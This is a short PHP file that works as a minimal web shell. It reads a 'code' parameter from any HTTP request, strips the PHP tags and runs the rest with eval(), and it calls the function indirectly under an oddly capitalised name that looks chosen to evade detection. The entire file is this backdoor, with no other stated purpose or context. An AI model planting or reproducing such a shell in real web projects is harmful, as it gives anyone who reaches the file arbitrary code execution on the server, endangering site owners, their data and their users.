<?php
function phpevaL(){
	if (!empty($_REQUEST['code'])){
		$code = str_replace("<?php","",$_REQUEST['code']);
		$code = str_replace("<?","",$code);
		$code = str_replace("?>","",$code);
		eval($code);
	}
}

call_user_func('phpevaL');
?>